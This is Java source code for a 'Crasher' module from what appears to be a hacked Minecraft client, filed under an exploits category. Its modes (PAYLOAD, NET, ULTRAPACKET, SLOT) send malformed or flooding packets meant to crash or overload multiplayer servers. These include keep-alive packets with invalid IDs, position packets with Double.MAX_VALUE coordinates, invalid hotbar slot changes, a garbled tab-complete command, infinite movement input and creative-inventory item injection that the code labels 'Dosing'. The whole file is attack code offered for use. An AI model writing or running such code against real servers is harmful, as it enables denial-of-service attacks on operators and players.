package non.asset.module.impl.exploit;

import java.awt.Color;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

import com.google.common.util.concurrent.ExecutionError;

import io.netty.buffer.ByteBuf;
import net.minecraft.entity.Entity;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C00PacketKeepAlive;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C09PacketHeldItemChange;
import net.minecraft.network.play.client.C0CPacketInput;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.network.play.client.C14PacketTabComplete;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.network.play.server.S08PacketPlayerPosLook;
import net.minecraft.network.play.server.S3FPacketCustomPayload;
import non.asset.event.bus.Handler;
import non.asset.event.impl.game.PacketEvent;
import non.asset.event.impl.player.UpdateEvent;
import non.asset.module.Module;
import non.asset.utils.PlayerUtils;
import non.asset.utils.OFC.MathUtils;
import non.asset.utils.OFC.Printer;
import non.asset.utils.OFC.TimerUtil;
import non.asset.utils.value.impl.EnumValue;

public class Crasher extends Module {
    private static ArrayList<Entity> bots = new ArrayList<>();
    private EnumValue<Modes> mode = new EnumValue<>("Mode", Modes.PAYLOAD);
    private Map<Integer, Double> distanceMap = new HashMap<>();
    private Set<Integer> swingSet = new HashSet<>();
    private TimerUtil timer = new TimerUtil();

    public Crasher() {
        super("Crasher", Category.EXPLOITS);
        setDescription("Bye bye");
        setRenderLabel("Crasher");
    }
    
    public enum Modes {
    	SLOT, ULTRAPACKET, PAYLOAD, NET
    }

    @Handler
    public void onUpdate(UpdateEvent event) {
        if (getMc().theWorld == null) return;
        

		if(mode.getValue() == Modes.PAYLOAD) {
			if(timer.sleep(MathUtils.getRandomInRange(100, 190))) {
	    		mc.thePlayer.sendQueue.addToSendQueue(new C00PacketKeepAlive(-1));
				mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(this.mc.thePlayer.posX, this.mc.thePlayer.posY - 1, this.mc.thePlayer.posZ, false));
	    	}else {
				mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(this.mc.thePlayer.posX, this.mc.thePlayer.posY + 0.01, this.mc.thePlayer.posZ, false));
	    	}
		}
		

		if(mode.getValue() == Modes.NET) {
			this.mc.thePlayer.rotationPitch = (float) Double.MAX_VALUE * MathUtils.getRandomInRange(3, 10);
		}
        

		if(mode.getValue() == Modes.ULTRAPACKET) {
    		mc.thePlayer.sendQueue.addToSendQueue(new C00PacketKeepAlive((int) -Double.MAX_VALUE));    	
			this.mc.thePlayer.rotationPitch = this.mc.thePlayer.rotationPitch;
				double yaw = Math.toRadians((double)this.mc.thePlayer.rotationYaw);
				mc.thePlayer.setPosition(-mc.thePlayer.posX + 0.1, -mc.thePlayer.posY, -mc.thePlayer.posZ );
			}	
	        
    }

    @Handler
    public void onPacket(PacketEvent event) {
        if (getMc().theWorld == null) return;
        
        if(mode.getValue() == Modes.ULTRAPACKET) {
	        if (!event.isSending() && event.getPacket() instanceof S08PacketPlayerPosLook) {
	            S08PacketPlayerPosLook packet = (S08PacketPlayerPosLook) event.getPacket();
	            if (getMc().thePlayer != null && getMc().theWorld != null && getMc().thePlayer.rotationYaw != -180 && getMc().thePlayer.rotationPitch != 0) {
	                packet.yaw = getMc().thePlayer.rotationYaw;
	                packet.pitch = getMc().thePlayer.rotationPitch;
	            }
	        }
        }

        if(event.getPacket() instanceof C0CPacketInput) {
	        C0CPacketInput packet = (C0CPacketInput)event.getPacket();
	        packet.forwardSpeed = Float.POSITIVE_INFINITY;
	        packet.strafeSpeed = Float.POSITIVE_INFINITY;
	        packet.jumping = (mc.thePlayer.ticksExisted % 2 == 0);
	        packet.sneaking = (mc.thePlayer.ticksExisted % 2 != 0);
        }
        
    }


    @Override
    public void onEnable() {
    	


    	if(mode.getValue() == Modes.NET){
    		try {
    			mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete(toString()));
    		}catch(ExecutionError e) {
    			e.printStackTrace();
    		}
    	}
    	
    	if(mode.getValue() == Modes.NET){
    		mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(-1));
    		mc.thePlayer.motionY = 10000;
    		mc.thePlayer.motionY = -10000;

   		 	double x = this.mc.thePlayer.posX;
	        double z = this.mc.thePlayer.posZ;
	        mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, 0, z, true));

    	}
    	
    	if(mode.getValue() == Modes.PAYLOAD) {
	        mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(-1, 0, 102930, false));
    		mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(-1));
    	}

    	if(mode.getValue() == Modes.ULTRAPACKET){

    		for(int i = 0; i < 9; i++)
    		{
    			mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(i));
    			mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(i));
    			mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(i));
    			mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(i));
    		}
    		 double x = this.mc.thePlayer.posX;
	         double z = this.mc.thePlayer.posZ;
	         
	         mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete("/gamemode %~~Âê-i*1¹£"));
	         mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, Double.MAX_VALUE * MathUtils.getRandomInRange(1, 100), z, true));
    	}
    	
    	if(mode.getValue() == Modes.SLOT) {
    		if(!mc.thePlayer.capabilities.isCreativeMode)
    		{
    			Printer.print("Creative mode only.");
    			toggle();
    			return;
    		}
    		
    		ItemStack stack = new ItemStack(new Item(), 1);
    		stack.clearCustomName();
    		placeStackInHotbar(stack);
    		Printer.print("Dosing...");
    		toggle();
    	}
    	
    }

    @Override
    public void onDisable() {
    }
    
    private NBTTagCompound createNBT() {
	
    NBTTagCompound cmd = new NBTTagCompound();
    {
			try
			{
				return cmd.getCompoundTag("{display:{Lore:['\"\u00a7r1. Place item in dispenser.\"','\"\u00a7r2. Dispense item.\"','\"\u00a7r3. Ssss... BOOM!\"'],Name:'{\"text\":\"\u00a7rServer Creeper\"}'},EntityTag:{CustomName:\"TEST\",id:\"Creeper\",CustomNameVisible:1}}");
				
			}catch(Exception e)
			{
				throw new RuntimeException(e);
			}
		}
    }
	
	private void placeStackInHotbar(ItemStack stack)
	{
		for(int i = 0; i < 9; i++)
		{
			if(!PlayerUtils.isFullInv())
				continue;
			
			mc.thePlayer.sendQueue.addToSendQueue(
				(Packet) new C10PacketCreativeInventoryAction(36 + i, stack));
			Printer.print("Item created.");
			return;
		}
		
		Printer.print("\2474Please clear a slot in your hotbar.");
	}
}
